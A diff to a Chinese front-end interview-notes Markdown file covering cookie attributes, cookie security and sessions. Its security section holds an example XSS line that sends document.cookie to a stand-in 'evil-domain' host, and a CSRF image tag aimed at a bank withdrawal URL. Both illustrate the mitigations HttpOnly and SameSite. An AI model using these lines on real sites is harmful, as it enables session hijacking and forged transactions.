@@ -1673,9 +1673,9 @@ ref
 【POST 请求(application/x-www-form-urlencoded)】
 ![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post3.png)
 
-### Cookie
+### ✔ Cookie
 
-#### Cookie 是什么
+#### ✔ Cookie 是什么
 
 ![cookie](https://qiniu1.lxfriday.xyz/feoffer/07ca8977-d2ab-480e-fc56-bd5704f27d1c.png)
 
@@ -1687,13 +1687,13 @@ Cookie 主要用于以下三个方面：
 - 个性化设置（如用户自定义设置、主题等）
 - 浏览器行为跟踪（如跟踪分析用户行为等）
 
-#### Domain
+#### ✔ Domain
 
 `Domain` 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。**如果指定了 Domain，则一般包含子域名（子域名可以访问父域名的 Cookie）**。
 
 例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如 `developer.mozilla.org`）。
 
-#### Path
+#### ✔ Path
 
 Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` (`/`) 作为路径分隔符，子路径也会被匹配。
 
@@ -1703,7 +1703,7 @@ Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径
 - `/docs/Web/`
 - `/docs/Web/HTTP`
 
-#### Expires/Max-Age
+#### ✔ Expires/Max-Age
 
 Cookie 的过期时间，过了这个时间之后 Cookie 将会自动删除。
 
@@ -1711,11 +1711,13 @@ Cookie 的过期时间，过了这个时间之后 Cookie 将会自动删除。
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 ```
 
+`Max-Age` 的单位是秒。
+
 ```javascript
 document.cookie = 'promo_shown=1; Max-Age=2600000; Secure'
 ```
 
-#### HttpOnly
+#### ✔ HttpOnly
 
 为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 `Document.cookie` API 无法访问带有 `HttpOnly` 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。
 
@@ -1723,15 +1725,16 @@ document.cookie = 'promo_shown=1; Max-Age=2600000; Secure'
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
 ```
 
-#### Secure
+#### ✔ Secure
 
 标记为 `Secure` 的 Cookie 只应通过**被 HTTPS 协议加密**过的请求发送给服务端。
 
-#### SameSite
+#### ✔ SameSite
 
 ref
 
 - [https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html](https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html)
+- [https://www.zhihu.com/question/373011996/answer/1027939207](https://www.zhihu.com/question/373011996/answer/1027939207)
 
 `SameSite` Cookie 允许服务器要求某个 Cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。
 
@@ -1743,7 +1746,7 @@ Set-Cookie: key=value; SameSite=Strict
 - `Strict` 浏览器将只发送相同站点请求的 Cookie(即当前网页 URL 与请求目标 URL 完全一致)。如果请求来自与当前 location 的 URL 不同的 URL，则不包括标记为 Strict 属性的 Cookie；
 - `Lax` 在新版本浏览器中，为**默认**选项，Same-site Cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接；
 
-#### 增删改查
+#### ✔ 增删改查
 
 ref
 
@@ -1788,9 +1791,11 @@ function getCookie(cname) {
 
 #### Cookie 常见问题
 
-1. Cookie 不区分端口
+1. Cookie 不区分端口；
+1. 一个 Cookie 存储上限是 4K 大小；
+1. Cookie 只能存储 ASCII 字符串；
 
-#### Cookie 安全-会话劫持和 XSS
+#### ✔ Cookie 安全-会话劫持和 XSS
 
 ```javascript
 new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
@@ -1798,7 +1803,7 @@ new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + docume
 
 `HttpOnly` 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
 
-#### Cookie 安全-跨站请求伪造（CSRF）
+#### ✔ Cookie 安全-跨站请求伪造（CSRF）
 
 ```html
 <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
@@ -1808,9 +1813,38 @@ new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + docume
 
 这种情况只是一种假设，实际上应该不允许使用 GET 修改数据，对转账的操作需要添加二次确认。
 
-### Session
+### ✔ Session
+
+Session 机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。
+
+当程序需要为某个客户端的请求创建一个 Session 时，服务器首先检查这个客户端的请求里是否已包含了一个 Session 标识（称为 Session ID），如果已包含则说明以前已经为此客户端创建过 Session，服务器就按照 Session ID 把这个 Session 检索出来使用（检索不到，会新建一个），如果客户端请求不包含 Session ID，则为此客户端创建一个 Session 并且生成一个与此 Session 相关联的 Session ID，Session ID 的值应该是一个**既不会重复，又不容易被找到规律以仿造的字符串**，这个 Session ID 将被在本次响应中返回给客户端保存。
+
+Session 从客户端传输到服务端的方式有两种：
+
+1. 通过 Cookie 传输；
+1. 通过 URL 传输；
+1. 表单隐藏字段，通过在 `<form>` 中添加一个隐藏字段，把 Session 传回服务器；
 
 基于 Cookie 实现，会话期 Cookie 是最简单的 Cookie：**浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效**。会话期 Cookie 不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。
+
+```http
+Set-Cookie: name=lxfriday.xyz; path=/; HttpOnly
+```
+
+![Session in Chrome](https://qiniu1.lxfriday.xyz/feoffer/67c6ab54-6de6-a5b4-fdd2-a1028587c7be.png)
+
+#### ✔ Cookie 与 Session 有什么不同
+
+ref
+
+- [Cookie 与 Session 的区别-总结很好的文章](https://mp.weixin.qq.com/s?__biz=MzA4MjA0MTc4NQ==&mid=504090000&idx=3&sn=f57d4f194c902daadd80296d5b8ed001#rd)
+
+1. **保存的地方不同**，Cookie 保存在客户端，Session 保存在服务端；
+1. **有效期不同**，Cookie 可以存储很长时间，Session 只能存在于一次会话中，浏览器关闭之后 Session 就失效了；
+1. **安全性不同**，Cookie 存储在客户端容易被盗取或者利用，Session 在服务端比较安全；
+1. **存储大小不同**，单个 Cookie 能存储 4K 的数据，Session 存储量比 Cookie 高得多；
+1. **存取方式不同**，Cookie 中只能保存 **ASCII 字符串**，假如需求存取 Unicode 字符或者二进制数据，需求先进行编码。Session 中能够存取**任何类型**的数据；
+1. **服务器压力不同**，Session 是存储在服务端的，巨大并发的时候会时服务器资源急速飙升。Cookie 则不存在此问题；
 
 ## UDP
 
